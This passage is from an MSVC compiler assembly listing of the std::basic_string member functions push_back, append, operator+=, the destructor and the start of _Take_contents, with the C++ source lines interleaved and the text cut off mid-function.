_this$ = -8						; size = 4
$T2 = -2						; size = 1
$T3 = -1						; size = 1
__Ch$ = 8						; size = 1
?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXD@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back, COMDAT
; _this$ = ecx

; 4082 :     _CONSTEXPR20 void push_back(const _Elem _Ch) { // insert element at end

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4083 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  0000f	89 4d f4	 mov	 DWORD PTR __Old_size$[ebp], ecx

; 4084 :         if (_Old_size < _Mypair._Myval2._Myres) {

  00012	8b 55 f8	 mov	 edx, DWORD PTR _this$[ebp]
  00015	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$[ebp]
  00018	3b 42 14	 cmp	 eax, DWORD PTR [edx+20]
  0001b	73 47		 jae	 SHORT $LN2@push_back

; 4085 :             _ASAN_STRING_MODIFY(*this, _Old_size, _Old_size + 1);
; 4086 :             _Mypair._Myval2._Mysize = _Old_size + 1;

  0001d	8b 4d f4	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  00020	83 c1 01	 add	 ecx, 1
  00023	8b 55 f8	 mov	 edx, DWORD PTR _this$[ebp]
  00026	89 4a 10	 mov	 DWORD PTR [edx+16], ecx

; 4087 :             _Elem* const _Ptr       = _Mypair._Myval2._Myptr();

  00029	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0002c	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEPADXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
  00031	89 45 f0	 mov	 DWORD PTR __Ptr$1[ebp], eax

; 4088 :             _Traits::assign(_Ptr[_Old_size], _Ch);

  00034	8d 45 08	 lea	 eax, DWORD PTR __Ch$[ebp]
  00037	50		 push	 eax
  00038	8b 4d f0	 mov	 ecx, DWORD PTR __Ptr$1[ebp]
  0003b	03 4d f4	 add	 ecx, DWORD PTR __Old_size$[ebp]
  0003e	51		 push	 ecx
  0003f	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
  00044	83 c4 08	 add	 esp, 8

; 4089 :             _Traits::assign(_Ptr[_Old_size + 1], _Elem());

  00047	c6 45 ff 00	 mov	 BYTE PTR $T3[ebp], 0
  0004b	8d 55 ff	 lea	 edx, DWORD PTR $T3[ebp]
  0004e	52		 push	 edx
  0004f	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$[ebp]
  00052	8b 4d f0	 mov	 ecx, DWORD PTR __Ptr$1[ebp]
  00055	8d 54 01 01	 lea	 edx, DWORD PTR [ecx+eax+1]
  00059	52		 push	 edx
  0005a	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
  0005f	83 c4 08	 add	 esp, 8

; 4090 :             return;

  00062	eb 19		 jmp	 SHORT $LN1@push_back
$LN2@push_back:

; 4091 :         }
; 4092 : 
; 4093 :         _Reallocate_grow_by(

  00064	33 c0		 xor	 eax, eax
  00066	88 45 fe	 mov	 BYTE PTR $T2[ebp], al
  00069	0f b6 4d 08	 movzx	 ecx, BYTE PTR __Ch$[ebp]
  0006d	51		 push	 ecx
  0006e	0f b6 55 fe	 movzx	 edx, BYTE PTR $T2[ebp]
  00072	52		 push	 edx
  00073	6a 01		 push	 1
  00075	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00078	e8 00 00 00 00	 call	 ??$_Reallocate_grow_by@V<lambda_15711c68e099a15a58f4d77303cb286d>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_15711c68e099a15a58f4d77303cb286d>@@D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_15711c68e099a15a58f4d77303cb286d>,char>
$LN1@push_back:

; 4094 :             1,
; 4095 :             [](_Elem* const _New_ptr, const _Elem* const _Old_ptr, const size_type _Old_size, const _Elem _Ch) {
; 4096 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);
; 4097 :                 _Traits::assign(_New_ptr[_Old_size], _Ch);
; 4098 :                 _Traits::assign(_New_ptr[_Old_size + 1], _Elem());
; 4099 :             },
; 4100 :             _Ch);
; 4101 :     }

  0007d	8b e5		 mov	 esp, ebp
  0007f	5d		 pop	 ebp
  00080	c2 04 00	 ret	 4
?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXD@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ID@Z
_TEXT	SEGMENT
__Old_ptr$1 = -16					; size = 4
__Old_size$ = -12					; size = 4
_this$ = -8						; size = 4
$T2 = -2						; size = 1
$T3 = -1						; size = 1
__Count$ = 8						; size = 4
__Ch$ = 12						; size = 1
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ID@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append, COMDAT
; _this$ = ecx

; 3331 :     _CONSTEXPR20 basic_string& append(_CRT_GUARDOVERFLOW const size_type _Count, const _Elem _Ch) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 3332 :         // append _Count * _Ch
; 3333 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  0000f	89 4d f4	 mov	 DWORD PTR __Old_size$[ebp], ecx

; 3334 :         if (_Count <= _Mypair._Myval2._Myres - _Old_size) {

  00012	8b 55 f8	 mov	 edx, DWORD PTR _this$[ebp]
  00015	8b 42 14	 mov	 eax, DWORD PTR [edx+20]
  00018	2b 45 f4	 sub	 eax, DWORD PTR __Old_size$[ebp]
  0001b	39 45 08	 cmp	 DWORD PTR __Count$[ebp], eax
  0001e	77 4e		 ja	 SHORT $LN2@append

; 3335 :             _ASAN_STRING_MODIFY(*this, _Old_size, _Old_size + _Count);
; 3336 :             _Mypair._Myval2._Mysize = _Old_size + _Count;

  00020	8b 4d f4	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  00023	03 4d 08	 add	 ecx, DWORD PTR __Count$[ebp]
  00026	8b 55 f8	 mov	 edx, DWORD PTR _this$[ebp]
  00029	89 4a 10	 mov	 DWORD PTR [edx+16], ecx

; 3337 :             _Elem* const _Old_ptr   = _Mypair._Myval2._Myptr();

  0002c	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0002f	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEPADXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
  00034	89 45 f0	 mov	 DWORD PTR __Old_ptr$1[ebp], eax

; 3338 :             _Traits::assign(_Old_ptr + _Old_size, _Count, _Ch);

  00037	0f b6 45 0c	 movzx	 eax, BYTE PTR __Ch$[ebp]
  0003b	50		 push	 eax
  0003c	8b 4d 08	 mov	 ecx, DWORD PTR __Count$[ebp]
  0003f	51		 push	 ecx
  00040	8b 55 f0	 mov	 edx, DWORD PTR __Old_ptr$1[ebp]
  00043	03 55 f4	 add	 edx, DWORD PTR __Old_size$[ebp]
  00046	52		 push	 edx
  00047	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAPADQADID@Z ; std::_Narrow_char_traits<char,int>::assign
  0004c	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3339 :             _Traits::assign(_Old_ptr[_Old_size + _Count], _Elem());

  0004f	c6 45 ff 00	 mov	 BYTE PTR $T3[ebp], 0
  00053	8d 45 ff	 lea	 eax, DWORD PTR $T3[ebp]
  00056	50		 push	 eax
  00057	8b 4d f4	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  0005a	03 4d 08	 add	 ecx, DWORD PTR __Count$[ebp]
  0005d	03 4d f0	 add	 ecx, DWORD PTR __Old_ptr$1[ebp]
  00060	51		 push	 ecx
  00061	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
  00066	83 c4 08	 add	 esp, 8

; 3340 :             return *this;

  00069	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0006c	eb 1f		 jmp	 SHORT $LN1@append
$LN2@append:

; 3341 :         }
; 3342 : 
; 3343 :         return _Reallocate_grow_by(

  0006e	33 d2		 xor	 edx, edx
  00070	88 55 fe	 mov	 BYTE PTR $T2[ebp], dl
  00073	0f b6 45 0c	 movzx	 eax, BYTE PTR __Ch$[ebp]
  00077	50		 push	 eax
  00078	8b 4d 08	 mov	 ecx, DWORD PTR __Count$[ebp]
  0007b	51		 push	 ecx
  0007c	0f b6 55 fe	 movzx	 edx, BYTE PTR $T2[ebp]
  00080	52		 push	 edx
  00081	8b 45 08	 mov	 eax, DWORD PTR __Count$[ebp]
  00084	50		 push	 eax
  00085	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00088	e8 00 00 00 00	 call	 ??$_Reallocate_grow_by@V<lambda_c1b8c41cb4019640539cfd828748c4d4>@@ID@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_c1b8c41cb4019640539cfd828748c4d4>@@ID@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_c1b8c41cb4019640539cfd828748c4d4>,unsigned int,char>
$LN1@append:

; 3344 :             _Count,
; 3345 :             [](_Elem* const _New_ptr, const _Elem* const _Old_ptr, const size_type _Old_size, const size_type _Count,
; 3346 :                 const _Elem _Ch) {
; 3347 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);
; 3348 :                 _Traits::assign(_New_ptr + _Old_size, _Count, _Ch);
; 3349 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());
; 3350 :             },
; 3351 :             _Count, _Ch);
; 3352 :     }

  0008d	8b e5		 mov	 esp, ebp
  0008f	5d		 pop	 ebp
  00090	c2 08 00	 ret	 8
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ID@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@QBD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Ptr$ = 8						; size = 4
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@QBD@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append, COMDAT
; _this$ = ecx

; 3327 :     _CONSTEXPR20 basic_string& append(_In_z_ const _Elem* const _Ptr) { // append [_Ptr, <null>)

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 3328 :         return append(_Ptr, _Convert_size<size_type>(_Traits::length(_Ptr)));

  00007	8b 45 08	 mov	 eax, DWORD PTR __Ptr$[ebp]
  0000a	50		 push	 eax
  0000b	e8 00 00 00 00	 call	 ?length@?$_Narrow_char_traits@DH@std@@SAIQBD@Z ; std::_Narrow_char_traits<char,int>::length
  00010	83 c4 04	 add	 esp, 4
  00013	50		 push	 eax
  00014	e8 00 00 00 00	 call	 ??$_Convert_size@II@std@@YAII@Z ; std::_Convert_size<unsigned int,unsigned int>
  00019	83 c4 04	 add	 esp, 4
  0001c	50		 push	 eax
  0001d	8b 4d 08	 mov	 ecx, DWORD PTR __Ptr$[ebp]
  00020	51		 push	 ecx
  00021	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00024	e8 00 00 00 00	 call	 ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@QBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append

; 3329 :     }

  00029	8b e5		 mov	 esp, ebp
  0002b	5d		 pop	 ebp
  0002c	c2 04 00	 ret	 4
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@QBD@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@QBDI@Z
_TEXT	SEGMENT
__Old_ptr$1 = -16					; size = 4
__Old_size$ = -12					; size = 4
_this$ = -8						; size = 4
$T2 = -2						; size = 1
$T3 = -1						; size = 1
__Ptr$ = 8						; size = 4
__Count$ = 12						; size = 4
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@QBDI@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append, COMDAT
; _this$ = ecx

; 3304 :         _In_reads_(_Count) const _Elem* const _Ptr, _CRT_GUARDOVERFLOW const size_type _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 3305 :         // append [_Ptr, _Ptr + _Count)
; 3306 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  0000f	89 4d f4	 mov	 DWORD PTR __Old_size$[ebp], ecx

; 3307 :         if (_Count <= _Mypair._Myval2._Myres - _Old_size) {

  00012	8b 55 f8	 mov	 edx, DWORD PTR _this$[ebp]
  00015	8b 42 14	 mov	 eax, DWORD PTR [edx+20]
  00018	2b 45 f4	 sub	 eax, DWORD PTR __Old_size$[ebp]
  0001b	39 45 0c	 cmp	 DWORD PTR __Count$[ebp], eax
  0001e	77 4d		 ja	 SHORT $LN2@append

; 3308 :             _ASAN_STRING_MODIFY(*this, _Old_size, _Old_size + _Count);
; 3309 :             _Mypair._Myval2._Mysize = _Old_size + _Count;

  00020	8b 4d f4	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  00023	03 4d 0c	 add	 ecx, DWORD PTR __Count$[ebp]
  00026	8b 55 f8	 mov	 edx, DWORD PTR _this$[ebp]
  00029	89 4a 10	 mov	 DWORD PTR [edx+16], ecx

; 3310 :             _Elem* const _Old_ptr   = _Mypair._Myval2._Myptr();

  0002c	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0002f	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEPADXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
  00034	89 45 f0	 mov	 DWORD PTR __Old_ptr$1[ebp], eax

; 3311 :             _Traits::move(_Old_ptr + _Old_size, _Ptr, _Count);

  00037	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  0003a	50		 push	 eax
  0003b	8b 4d 08	 mov	 ecx, DWORD PTR __Ptr$[ebp]
  0003e	51		 push	 ecx
  0003f	8b 55 f0	 mov	 edx, DWORD PTR __Old_ptr$1[ebp]
  00042	03 55 f4	 add	 edx, DWORD PTR __Old_size$[ebp]
  00045	52		 push	 edx
  00046	e8 00 00 00 00	 call	 ?move@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ; std::_Char_traits<char,int>::move
  0004b	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3312 :             _Traits::assign(_Old_ptr[_Old_size + _Count], _Elem());

  0004e	c6 45 ff 00	 mov	 BYTE PTR $T3[ebp], 0
  00052	8d 45 ff	 lea	 eax, DWORD PTR $T3[ebp]
  00055	50		 push	 eax
  00056	8b 4d f4	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  00059	03 4d 0c	 add	 ecx, DWORD PTR __Count$[ebp]
  0005c	03 4d f0	 add	 ecx, DWORD PTR __Old_ptr$1[ebp]
  0005f	51		 push	 ecx
  00060	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
  00065	83 c4 08	 add	 esp, 8

; 3313 :             return *this;

  00068	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0006b	eb 1e		 jmp	 SHORT $LN1@append
$LN2@append:

; 3314 :         }
; 3315 : 
; 3316 :         return _Reallocate_grow_by(

  0006d	33 d2		 xor	 edx, edx
  0006f	88 55 fe	 mov	 BYTE PTR $T2[ebp], dl
  00072	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  00075	50		 push	 eax
  00076	8b 4d 08	 mov	 ecx, DWORD PTR __Ptr$[ebp]
  00079	51		 push	 ecx
  0007a	0f b6 55 fe	 movzx	 edx, BYTE PTR $T2[ebp]
  0007e	52		 push	 edx
  0007f	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  00082	50		 push	 eax
  00083	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00086	e8 00 00 00 00	 call	 ??$_Reallocate_grow_by@V<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_ab246b20b9526e2ef7792587e4298a77>,char const *,unsigned int>
$LN1@append:

; 3317 :             _Count,
; 3318 :             [](_Elem* const _New_ptr, const _Elem* const _Old_ptr, const size_type _Old_size, const _Elem* const _Ptr,
; 3319 :                 const size_type _Count) {
; 3320 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);
; 3321 :                 _Traits::copy(_New_ptr + _Old_size, _Ptr, _Count);
; 3322 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());
; 3323 :             },
; 3324 :             _Ptr, _Count);
; 3325 :     }

  0008b	8b e5		 mov	 esp, ebp
  0008d	5d		 pop	 ebp
  0008e	c2 08 00	 ret	 8
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@QBDI@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ABV12@@Z
_TEXT	SEGMENT
_this$ = -12						; size = 4
tv76 = -8						; size = 4
tv78 = -4						; size = 4
__Right$ = 8						; size = 4
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ABV12@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append, COMDAT
; _this$ = ecx

; 3276 :     _CONSTEXPR20 basic_string& append(const basic_string& _Right) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d f4	 mov	 DWORD PTR _this$[ebp], ecx

; 3277 :         return append(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  00009	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  0000c	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  0000f	89 4d fc	 mov	 DWORD PTR tv78[ebp], ecx
  00012	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  00015	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QBEPBDXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
  0001a	89 45 f8	 mov	 DWORD PTR tv76[ebp], eax
  0001d	8b 55 fc	 mov	 edx, DWORD PTR tv78[ebp]
  00020	52		 push	 edx
  00021	8b 45 f8	 mov	 eax, DWORD PTR tv76[ebp]
  00024	50		 push	 eax
  00025	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  00028	e8 00 00 00 00	 call	 ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@QBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append

; 3278 :     }

  0002d	8b e5		 mov	 esp, ebp
  0002f	5d		 pop	 ebp
  00030	c2 04 00	 ret	 4
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ABV12@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@D@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Ch$ = 8						; size = 1
??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@D@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=, COMDAT
; _this$ = ecx

; 3271 :     _CONSTEXPR20 basic_string& operator+=(_Elem _Ch) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 3272 :         push_back(_Ch);

  00007	0f b6 45 08	 movzx	 eax, BYTE PTR __Ch$[ebp]
  0000b	50		 push	 eax
  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back

; 3273 :         return *this;

  00014	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]

; 3274 :     }

  00017	8b e5		 mov	 esp, ebp
  00019	5d		 pop	 ebp
  0001a	c2 04 00	 ret	 4
??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@D@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV01@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Right$ = 8						; size = 4
??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV01@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=, COMDAT
; _this$ = ecx

; 3256 :     _CONSTEXPR20 basic_string& operator+=(const basic_string& _Right) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 3257 :         return append(_Right);

  00007	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	e8 00 00 00 00	 call	 ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ABV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append

; 3258 :     }

  00013	8b e5		 mov	 esp, ebp
  00015	5d		 pop	 ebp
  00016	c2 04 00	 ret	 4
??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV01@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >, COMDAT
; _this$ = ecx

; 3176 :     _CONSTEXPR20 ~basic_string() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 3177 :         _Tidy_deallocate();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_deallocate

; 3178 : #if _ITERATOR_DEBUG_LEVEL != 0
; 3179 :         auto&& _Alproxy          = _GET_PROXY_ALLOCATOR(_Alty, _Getal());
; 3180 :         const auto _To_delete    = _Mypair._Myval2._Myproxy;
; 3181 :         _Mypair._Myval2._Myproxy = nullptr;
; 3182 :         _Delete_plain_internal(_Alproxy, _To_delete);
; 3183 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 3184 :     }

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	e8 00 00 00 00	 call	 ??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@XZ
  00017	8b e5		 mov	 esp, ebp
  00019	5d		 pop	 ebp
  0001a	c3		 ret	 0
??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXAAV12@@Z
_TEXT	SEGMENT
__My_data_mem$1 = -24					; size = 4
__Right_data_mem$2 = -20				; size = 4
_this$ = -16						; size = 4
__My_data$ = -12					; size = 4
__Right_data$ = -8					; size = 4
$T3 = -2						; size = 1
$T4 = -1						; size = 1
__Right$ = 8						; size = 4
?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXAAV12@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Take_contents, COMDAT
; _this$ = ecx

; 3052 :     _CONSTEXPR20 void _Take_contents(basic_string& _Right) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 18	 sub	 esp, 24			; 00000018H
  00006	89 4d f0	 mov	 DWORD PTR _this$[ebp], ecx

; 3053 :         // assign by stealing _Right's buffer
; 3054 :         // pre: this != &_Right
; 3055 :         // pre: allocator propagation (POCMA) from _Right, if necessary, is complete
; 3056 :         // pre: *this owns no memory, iterators orphaned
; 3057 :         // (note: _Buf/_Ptr/_Mysize/_Myres may be garbage init)
; 3058 :         auto& _My_data    = _Mypair._Myval2;

  00009	8b 45 f0	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f4	 mov	 DWORD PTR __My_data$[ebp], eax

; 3059 :         auto& _Right_data = _Right._Mypair._Myval2;

  0000f	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  00012	89 4d f8	 mov	 DWORD PTR __Right_data$[ebp], ecx

; 3060 : 
; 3061 : #if !defined(_INSERT_STRING_ANNOTATION)
; 3062 :         if constexpr (_Can_memcpy_val) {
; 3063 : #if _HAS_CXX20
; 3064 :             if (!_STD is_constant_evaluated())
; 3065 : #endif // _HAS_CXX20
; 3066 :             {
; 3067 : #if _ITERATOR_DEBUG_LEVEL != 0
; 3068 :                 if (_Right_data._Large_mode_engaged()) {
; 3069 :                     // take ownership of _Right's iterators along with its buffer
; 3070 :                     _Swap_proxy_and_iterators(_Right);
; 3071 :                 } else {
; 3072 :                     _Right_data._Orphan_all();
; 3073 :                 }
; 3074 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 3075 : 
; 3076 :                 const auto _My_data_mem =

  00015	8b 55 f0	 mov	 edx, DWORD PTR _this$[ebp]
  00018	52		 push	 edx
